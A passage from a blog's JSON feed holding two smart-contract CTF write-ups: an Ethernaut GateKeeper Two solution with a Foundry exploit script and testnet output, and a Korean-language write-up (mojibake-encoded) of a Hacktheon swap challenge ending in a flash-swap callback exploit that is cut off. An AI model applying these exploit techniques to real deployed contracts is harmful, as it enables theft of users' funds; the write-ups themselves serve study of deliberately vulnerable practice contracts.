{
    "version": "https://jsonfeed.org/version/1",
    "title": "0o3q",
    "home_page_url": "https://0o3q.github.io/",
    "feed_url": "https://0o3q.github.io/feed.json",
    "description": "studying web3",
    "icon": "https://0o3q.github.io/apple-touch-icon.png",
    "favicon": "https://0o3q.github.io/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "0o3q",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://0o3q.github.io/2025/04/28/gatekeepertwo",
            "title": "[Ethernaut] GateKeeper Two",
            "summary": null,
            "content_text": "AnalysisThe goal is  Register as an entrant to pass this level.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo {    address public entrant;    modifier gateOne() {        require(msg.sender != tx.origin);        _;    }    modifier gateTwo() {        uint256 x;        assembly {            x := extcodesize(caller())        }        require(x == 0);        _;    }    modifier gateThree(bytes8 _gateKey) {        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);        _;    }    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {        entrant = tx.origin;        return true;    }}assembly keyword allows a contract to access functionality that is not native to vanilla Solidity.extcodesize call will get the size of a contract‚Äôs code at a given address.If the size of a contract‚Äôs code at a given address is zero, it indicates that the address is EOAHowever, this seems to conflict with gateOne() modifierIn section 7 of yellow paper, I found sentence:  ‚ÄúDuring initialization code execution, EXTCODESIZE on the address should return zero‚ÄùI also found the concept ‚Äúinitialization code excution‚Äù in here.  üí° When a contract is created, its¬†constructor¬†(a function declared with the¬†constructor¬†keyword) is executed once.Solving the gateThree() modifier is straightforward if you use the properties of XOR:given uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max , derive uint64(_gateKey)  by computing uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).maxExploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/GateKeeperTwo.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(GatekeeperTwo gkt_) {        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);        gkt_.enter(gateKey);    }}contract GateKeeperTwoSol is Script {    GatekeeperTwo public gkt_ = GatekeeperTwo(0x1376d3d0070BE56e26c6F566EeC4fd975bD1aC63);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));            console.log(\"Before entrant: \", gkt_.entrant());        Ex ex = new Ex(gkt_);        console.log(\"After entrant: \", gkt_.entrant());        vm.stopBroadcast();    }}$ forge script script/GateKeeperTwoSol.sol:GateKeeperTwoSol --broadcast[‚†ä] Compiling...[‚†í] Compiling 26 files with Solc 0.8.29[‚†Ü] Compiling 4 files with Solc 0.6.12[‚†ë] Solc 0.6.12 finished in 42.16ms[‚†ò] Solc 0.8.29 finished in 335.40msCompiler run successful with warnings:Warning (2072): Unused local variable.  --&gt; script/GateKeeperTwoSol.sol:22:9:   |22 |         Ex ex = new Ex(gkt_);   |         ^^^^^Script ran successfully.== Logs ==  Before entrant:  0x0000000000000000000000000000000000000000  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.00107283 gweiEstimated total gas used for script: 135274Estimated amount required: 0.00000014512600542 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xe75e5f11118632a6eab29c325a0fdaa1891b6b082a341d628eb26f3b155cc2a1Contract Address: 0x4D05500E91144D2F8aa3A2E54050659eC22bD6c2Block: 3750329Paid: 0.000000111634638854 ETH (104057 gas * 0.001072822 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000111634638854 ETH (104057 gas * avg 0.001072822 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Register as an entrant to pass this level.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">GatekeeperTwo</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">entrant</span><span class=\"p\">;</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateOne</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">!=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateTwo</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">x</span><span class=\"p\">;</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">x</span> <span class=\"o\">:=</span> <span class=\"n\">extcodesize</span><span class=\"p\">(</span><span class=\"n\">caller</span><span class=\"p\">())</span>        <span class=\"p\">}</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">x</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">))))</span> <span class=\"o\">^</span> <span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"k\">type</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">).</span><span class=\"n\">max</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">gateOne</span> <span class=\"n\">gateTwo</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">entrant</span> <span class=\"o\">=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">assembly</code> keyword allows a contract to access functionality that is not native to vanilla Solidity.</p><p><code class=\"language-plaintext highlighter-rouge\">extcodesize</code> call will get the size of a contract‚Äôs code at a given address.</p><p>If the size of a contract‚Äôs code at a given address is zero, it indicates that the address is EOA</p><p>However, this seems to conflict with <code class=\"language-plaintext highlighter-rouge\">gateOne()</code> modifier</p><p>In section 7 of <a href=\"https://ethereum.github.io/yellowpaper/paper.pdf\">yellow paper</a>, I found sentence:</p><blockquote>  <p>‚ÄúDuring initialization code execution, EXTCODESIZE on the address should return zero‚Äù</p></blockquote><p>I also found the concept ‚Äúinitialization code excution‚Äù in <a href=\"https://docs.soliditylang.org/en/latest/contracts.html#creating-contracts\">here</a>.</p><blockquote>  <p>üí° When a contract is <strong>created</strong>, its¬†<a href=\"https://docs.soliditylang.org/en/latest/contracts.html#constructor\">constructor</a>¬†(a function declared with the¬†<code class=\"language-plaintext highlighter-rouge\">constructor</code>¬†keyword) is executed once.</p></blockquote><p>Solving the <code class=\"language-plaintext highlighter-rouge\">gateThree()</code> modifier is straightforward if you use the properties of XOR:</p><p>given <code class=\"language-plaintext highlighter-rouge\">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max</code> , derive <code class=\"language-plaintext highlighter-rouge\">uint64(_gateKey)</code>  by computing <code class=\"language-plaintext highlighter-rouge\">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</code></p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/GateKeeperTwo.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">GatekeeperTwo</span> <span class=\"n\">gkt_</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">bytes8</span> <span class=\"n\">gateKey</span> <span class=\"o\">=</span> <span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)))))</span> <span class=\"o\">^</span> <span class=\"k\">type</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">).</span><span class=\"n\">max</span><span class=\"p\">);</span>        <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"n\">gateKey</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">GateKeeperTwoSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">GatekeeperTwo</span> <span class=\"k\">public</span> <span class=\"n\">gkt_</span> <span class=\"o\">=</span> <span class=\"n\">GatekeeperTwo</span><span class=\"p\">(</span><span class=\"mh\">0x1376d3d0070BE56e26c6F566EeC4fd975bD1aC63</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>            <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">gkt_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/GateKeeperTwoSol.sol:GateKeeperTwoSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†í] Compiling 26 files with Solc 0.8.29<span class=\"o\">[</span>‚†Ü] Compiling 4 files with Solc 0.6.12<span class=\"o\">[</span>‚†ë] Solc 0.6.12 finished <span class=\"k\">in </span>42.16ms<span class=\"o\">[</span>‚†ò] Solc 0.8.29 finished <span class=\"k\">in </span>335.40msCompiler run successful with warnings:Warning <span class=\"o\">(</span>2072<span class=\"o\">)</span>: Unused <span class=\"nb\">local </span>variable.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/GateKeeperTwoSol.sol:22:9:   |22 |         Ex ex <span class=\"o\">=</span> new Ex<span class=\"o\">(</span>gkt_<span class=\"o\">)</span><span class=\"p\">;</span>   |         ^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before entrant:  0x0000000000000000000000000000000000000000  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.00107283 gweiEstimated total gas used <span class=\"k\">for </span>script: 135274Estimated amount required: 0.00000014512600542 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xe75e5f11118632a6eab29c325a0fdaa1891b6b082a341d628eb26f3b155cc2a1Contract Address: 0x4D05500E91144D2F8aa3A2E54050659eC22bD6c2Block: 3750329Paid: 0.000000111634638854 ETH <span class=\"o\">(</span>104057 gas <span class=\"k\">*</span> 0.001072822 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000111634638854 ETH (104057 gas * avg 0.001072822 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-28-GateKeeperTwo/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/28/gatekeepertwo",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","assembly","extcodesize","XOR"],
            
            "date_published": "2025-04-28T00:00:00+09:00",
            "date_modified": "2025-04-28T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/27/hacktheon-contact",
            "title": "2025 ÌïµÌÖåÏò® contract",
            "summary": null,
            "content_text": "contract.zip2025 Ìó•ÌÖåÏò® ÏÑ∏Ï¢ÖÏóê Ï∂úÏ†úÎêòÏóàÎçò contract Î¨∏Ï†úÏù¥Îã§.ÏÑúÎ≤ÑÍ∞Ä Îã´ÌòîÏßÄÎßå ÎèÑÏª§ÌååÏùºÍ≥º Ìï®Íªò ÌååÏùºÏùÑ Î∞õÏïÑ Î°úÏª¨ÏóêÏÑú Îã§Ïãú ÌíÄÏñ¥Î≥¥Î†§ÌïúÎã§.Î¨∏Ï†ú Î∂ÑÏÑù// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.20;import {Script} from \"forge-std/Script.sol\";import \"forge-std/console.sol\";import {WETH} from \"../src/WETH.sol\";import {HTOToken} from \"../src/HTOToken.sol\";import {DepositNFT} from \"../src/DepositNFT.sol\";import {VestingNFT} from \"../src/VestingNFT.sol\";import {YieldVault} from \"../src/YieldVault.sol\";import {Swap} from \"../src/Swap.sol\";contract DeployScript is Script {    function run() public {        vm.startBroadcast();        WETH wETH = new WETH();        console.log(\"wETH deployed at:\", address(wETH));                HTOToken htoToken = new HTOToken();        console.log(\"HTOToken deployed at:\", address(htoToken));                DepositNFT depositNFT = new DepositNFT();        console.log(\"DepositNFT deployed at:\", address(depositNFT));                VestingNFT vestingNFT = new VestingNFT();        console.log(\"VestingNFT deployed at:\", address(vestingNFT));                YieldVault yieldVault = new YieldVault(            address(wETH),            address(htoToken),            address(depositNFT),            address(vestingNFT)        );        console.log(\"YieldVault deployed at:\", address(yieldVault));        wETH.mint(address(yieldVault), 255);         htoToken.mint(address(yieldVault), 340282366920938463463374607431768211455);         depositNFT.transferOwnership(address(yieldVault));        vestingNFT.transferOwnership(address(yieldVault));        Swap swap = new Swap(address(wETH), address(htoToken));        console.log(\"Swap deployed at:\", address(swap));        wETH.mint(address(swap), 4294967295);         htoToken.mint(address(swap), 18446744073709551615);         vm.stopBroadcast();    }}script/Deploy.s.solÏóêÏÑúÎäî Î¨∏Ï†úÎ•º Î∞∞Ìè¨ÌïòÍ∏∞ ÏúÑÌïú ÏÑ∏ÌåÖÏùÑ Ìï¥Ï£ºÍ≥† ÏûàÎã§.Î¨∏Ï†úÎ•º ÏúÑÌïú contractÏùò addressÎ•º Ï∂úÎ†•Ìïú Ïù¥ÌõÑÏóêÎäî src/WETH.solÏùò mint Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÍ≥† ÏûàÎã§.src/WETH.sol// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.20;import {Script} from \"forge-std/Script.sol\";import \"forge-std/console.sol\";import { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";import { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\";contract WETH is ERC20, Ownable {    constructor() ERC20(\"Wrapping ETH\", \"WETH\") Ownable(msg.sender) {    }    function mint(address sender, uint256 amount) external onlyOwner {        _mint(sender, amount);    }    function flag() external returns (string memory) {        if(this.balanceOf(msg.sender) &gt; 100000000) {            _burn(msg.sender, 100000000);            return \"FLAG{THIS_IS_FAKE_FLAG}\";        }        return \"\";    }}src/WETH.sol ÏΩîÎìúÎäî Îã§ÏùåÍ≥º Í∞ôÏúºÎ©∞ Ìï¥Îãπ ÌååÏùºÏóêÏÑú flag Ìï®ÏàòÎ°ú FLAGÎ•º ÏñªÏùÑ Ïàò ÏûàÏùÑ Í≤ÉÏúºÎ°ú Î≥¥Ïù∏Îã§.mint Ìï®Ïàòmint Ìï®ÏàòÎäî _mint Ìï®ÏàòÎ•º Îã§Ïãú Ìò∏Ï∂úÌïòÍ≥† ÏûàÏúºÎ©∞ Ïù¥ Ìï®ÏàòÍ∞Ä Ïñ¥Îñ§ Í∏∞Îä•ÏùÑ ÌïòÎäîÏßÄ Ï∞æÍ∏∞ ÏúÑÌï¥ Í≤ÄÏÉâÌï¥Î≥¥Î©¥function _mint(address account, uint256 value) internal {    if (account == address(0)) {        revert ERC20InvalidReceiver(address(0));    }    _update(address(0), account, value);}Îã§ÏùåÍ≥º Í∞ôÏùÄ ÏΩîÎìúÎ•º Î≥º Ïàò ÏûàÏóàÎã§.script/Deploy.s.sol ÏóêÏÑú Î≥º Ïàò ÏûàÎìØÏù¥ account Î≥ÄÏàòÎ°ú address(yieldVault) Î•º Ï†ÑÎã¨ Î∞õÏïòÍ∏∞Ïóê Î∞îÎ°ú _update Ìï®ÏàòÎ°ú Í∞ÄÎ≥¥Î©¥function _update(address from, address to, uint256 value) internal virtual {    if (from == address(0)) {        // Overflow check required: The rest of the code assumes that totalSupply never overflows        _totalSupply += value;    } else {        uint256 fromBalance = _balances[from];        if (fromBalance &lt; value) {            revert ERC20InsufficientBalance(from, fromBalance, value);        }        unchecked {            // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.            _balances[from] = fromBalance - value;        }    }    if (to == address(0)) {        unchecked {            // Overflow not possible: value &lt;= totalSupply or value &lt;= fromBalance &lt;= totalSupply.            _totalSupply -= value;        }    } else {        unchecked {            // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.            _balances[to] += value;        }    }    emit Transfer(from, to, value);}uint256 private _totalSupply  Î≥ÄÏàòÏóê ÏûÖÎ†•Î∞õÏùÄ 255Î•º Ï†ÄÏû•Ìïú Îí§, address(yieldVault) Ïùò _balance Í∞íÏùÑ 255 ÎçîÌï¥Ï£ºÎäî Í≤ÉÏùÑ Î≥º Ïàò ÏûàÎã§.Ïù¥Îïå unchecked Î°ú Í∞êÏã∏Ï†∏ ÏûàÏúºÎØÄÎ°ú Ïò§Î≤ÑÌîåÎ°úÏö∞ Ï∑®ÏïΩÏ†êÏù¥ Î∞úÏÉùÌï† Ïàò ÏûàÏßÄÎßå ÏΩîÎìú ÏÉÅÏóêÏÑú Ïù¥Î°ú Ïù∏Ìïú Ïò§Î≤ÑÌîåÎ°úÏö∞Í∞Ä Î∞úÏÉùÌï† Í∞ÄÎä•ÏÑ±ÏùÄ ÏóÜÏñ¥Î≥¥Ïù∏Îã§._balancesÎäî Îã§ÏùåÍ≥º Í∞ôÎã§.mapping(address account =&gt; uint256) private _balances;Ïù¥Î°ú Ïù∏Ìï¥ mint Ìï®ÏàòÎäî Ï£ºÏÜåÏóê ÏûÖÎ†•Ìïú ÎßåÌÅºÏùò ÌÜ†ÌÅ∞ÏùÑ ÏÉùÏÑ±Ìï¥Ï§ÄÎã§Îäî Í≤ÉÏùÑ Ïïå Ïàò ÏûàÏóàÎã§.src/Swap.sol// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.20;import { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";import { ReentrancyGuard } from \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";import { WETH } from \"./WETH.sol\";import { HTOToken } from \"./HTOToken.sol\";interface IUniswapV2Callee {  function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata data) external;}contract Swap is ReentrancyGuard {  WETH public wETH;   HTOToken public htoToken;  constructor(address _wETH, address _htoToken) {    wETH = WETH(_wETH);    htoToken = HTOToken(_htoToken);  }  function _getExchange(uint amount0Out, uint amount1Out) public returns (uint) {    return amount0Out != 0 ? amount0Out * 2 : amount1Out / 2;   }  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external nonReentrant {    address _from;    address _to;    uint _amount;    if (amount0Out != 0) {      _from = address(wETH);      _to = address(htoToken);      _amount = amount0Out;    } else {      _to = address(wETH);      _from = address(htoToken);      _amount = amount1Out;    }    if (data.length == 0) {      IERC20(_to).transfer(to, _getExchange(amount0Out, amount1Out));      IERC20(_from).transferFrom(to, address(this), _amount);    } else {      uint balanceBefore = IERC20(_from).balanceOf(address(this));      IERC20(_from).transfer(to, _amount);        IUniswapV2Callee(to).uniswapV2Call(to, amount0Out, amount1Out, data);      uint balanceAfter = IERC20(_from).balanceOf(address(this));      require(balanceAfter &gt;= balanceBefore);    }  }}swap Ìï®ÏàòÏóêÏÑú Ï†ÑÎã¨Î∞õÏùÄ amount0Out Î≥ÄÏàòÎ•º ÌÜµÌï¥ 0Ïù∏ÏßÄ ÏïÑÎãåÏßÄÏóê Îî∞Îùº wETHÏóêÏÑú htoTokendÏúºÎ°ú Î≥¥ÎÇºÏßÄ, htoTokenÏóêÏÑú wETHÎ°ú Î≥¥ÎÇºÏßÄÎ•º Í≤∞Ï†ïÌïòÍ≥† ÏûàÎã§.Í∑∏ Îã§Ïùå  data.length Í∞Ä 0Ïù¥Î©¥ toÎ°ú Î®ºÏ†Ä _toÏùò ÌÜ†ÌÅ∞ÏùÑ Î≥¥ÎÇ∏ Îí§, _from  ÏúºÎ°ú Î∂ÄÌÑ∞ ÌÜ†ÌÅ∞ÏùÑ Î∞õÏïÑÏò®Îã§.Ïó¨Í∏∞ÏÑú Checks-Effectes Interaction Ìå®ÌÑ¥Ïù¥ Ï†ÅÏö©ÎêòÏßÄ ÏïäÏïÑ _toÏùò ÌÜ†ÌÅ∞ÏùÑ Î®ºÏ†Ä Î≥¥ÎÇ∏ Îí§, _from Ïùò ÌÜ†ÌÅ∞ÏùÑ Î∞õÏïÑÏò§Í≥† ÏûàÏñ¥ _fromÏùò ÌÜ†ÌÅ∞Ïù¥ Ï∂©Î∂ÑÌïòÏßÄ ÏïäÏïÑÎèÑ Í∞íÏùÑ Î≥¥ÎÇº Ïàò ÏûàÏñ¥ Î≥¥Ïù∏Îã§.transferFrom Ìï®Ïàòfunction transferFrom(address from, address to, uint256 value) public virtualreturns (bool) {    address spender = _msgSender();    _spendAllowance(from, spender, value);    _transfer(from, to, value);    return true;}transferFrom  Ìï®ÏàòÎäî Îã§ÏùåÍ≥º Í∞ôÏúºÎ©∞ ÏïÑÍπåÏùò mint Ìï®ÏàòÏôÄ Í∞ôÏù¥function _transfer(address from, address to, uint256 value) internal {    if (from == address(0)) {        revert ERC20InvalidSender(address(0));    }    if (to == address(0)) {        revert ERC20InvalidReceiver(address(0));    }    _update(from, to, value);}_transfer Ìï®ÏàòÎ•º Í±∞Ï≥ê _update Ìï®ÏàòÎ°ú ÏßÑÏûÖÌïúÎã§.function _update(address from, address to, uint256 value) internal virtual {    if (from == address(0)) {        // Overflow check required: The rest of the code assumes thattotalSupply never overflows        _totalSupply += value;    } else {        uint256 fromBalance = _balances[from];        if (fromBalance &lt; value) {            revert ERC20InsufficientBalance(from, fromBalance, value);        }        unchecked {            // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.            _balances[from] = fromBalance - value;        }    }    if (to == address(0)) {        unchecked {            // Overflow not possible: value &lt;= totalSupply or value &lt;=fromBalance &lt;= totalSupply.            _totalSupply -= value;        }    } else {        unchecked {            // Overflow not possible: balance + value is at most totalSupply,which we know fits into a uint256.            _balances[to] += value;        }    }    emit Transfer(from, to, value);}_update Ìï®ÏàòÏóêÏÑú ÌÜ†ÌÅ∞Ïù¥ Î≥¥ÎÇ¥Î†§Í≥† ÌïòÎäî Í∞íÎ≥¥Îã§ Ï†ÅÏùÄ Í≤ΩÏö∞ÏùºÎïå 8Î≤àÏß∏ Ï§ÑÏóêÏÑú revert ÌïòÍ≥† ÏûàÏúºÎØÄÎ°ú solidityÏùò ÏõêÏûêÏÑ±Ïóê ÏùòÌï¥ ÌÜ†ÌÅ∞Ïù¥ Ï∂©Î∂ÑÌïòÏßÄ ÏïäÏùÑ Îïå Î∞úÏÉùÌï† Ïàò ÏûàÎäî Ï∑®ÏïΩÏ†êÏùÄ ÏóÜÏñ¥ Î≥¥Ïù∏Îã§._getExchange Ìï®ÏàòÎ•º Î≥¥Î©¥ wETHÏóêÏÑú  htoToken ÏúºÎ°ú Î≥¥ÎÇº ÎïåÎäî ÌÜ†ÌÅ∞ÏùÑ 2Î∞∞Î°ú Î≥¥ÎÇ¥ÏßÄÎßå, Î∞òÎåÄÏùº ÎïåÎäî 1/2Î∞∞ Î≥¥ÎÇ¥Îäî Í≤ÉÏùÑ Î≥º Ïàò ÏûàÎã§.data.length Í∞Ä 0Ïù¥ ÏïÑÎãå Í≤ΩÏö∞ÏóêÎäî _from ÌÜ†ÌÅ∞Ïùò Í∞úÏàòÎ•º balanceBefore Î≥ÄÏàòÏóê Ï†ÄÏû•Ìïú Îí§, ÌÜ†ÌÅ∞ÏùÑ Î≥¥ÎÇ∏Îã§.Ïù¥ÌõÑ IUniswapV2Callee contractÏùò  uniswapV2Call Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÍ≥† ÏûàÎã§.uniswapV2Call Ìï®ÏàòÍµ¨Í∏ÄÎßÅÏùÑ ÌÜµÌï¥ Î¨∏ÏÑúÎ•º Ï∞æÏùÑ Ïàò ÏûàÏóàÎã§.Flash Swaps Uniswapflash loanÏù¥ Í∞ÄÎä•ÌïòÍ≤å ÌïòÍ≥† ÏûàÏóàÍ≥† Ïù¥Ï†Ñ data.lengthÍ∞Ä 0ÏùºÎïå Í∏∞Îä•Í≥º ÌÅ¨Í≤å Ï∞®Ïù¥Í∞Ä ÎÇòÎ≥¥Ïù¥ÏßÄ ÏïäÎäîÎã§.SwapÏùÑ ÌÜµÌï¥ wETHÏùò balanceOfÎ•º 100000000 Ïù¥ÏÉÅÏúºÎ°ú ÎßåÎì† Îí§ FLAGÎ•º Ïö∞ÏÑ† ÏñªÎäîÎã§Î©¥ ÌõÑÏóê swap Ìï®ÏàòÏóêÏÑú revert Í∞Ä Î∞úÏÉùÌïòÏó¨ÎèÑ FLAGÎ•º ÏñªÏùÑ Ïàò ÏûàÎã§.Exploit// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.20;import \"forge-std/Script.sol\";import \"forge-std/console.sol\";import { IUniswapV2Callee } from \"../src/Swap.sol\";import { Swap } from \"../src/Swap.sol\";import { WETH } from \"../src/WETH.sol\";contract Ex is IUniswapV2Callee {    Swap public swap_ = Swap(0x8A791620dd6260079BF849Dc5567aDC3F2FdC318);    WETH public weth_ = WETH(0x5FbDB2315678afecb367f032d93F642f64180aa3);    address public immutable owner;    string public flag;    function ex() external {        try swap_.swap(100_000_001, 0, address(this), abi.encode(\"mingw\")) {        } catch {        }    }    function uniswapV2Call(address, uint amount0Out, uint, bytes calldata) external override {        flag = weth_.flag();        console.log(\"FLAG: \", flag);    }}contract Exploit is Script {    function run() external {        vm.startBroadcast();        Ex ex = new Ex();        ex.ex();        vm.stopBroadcast();    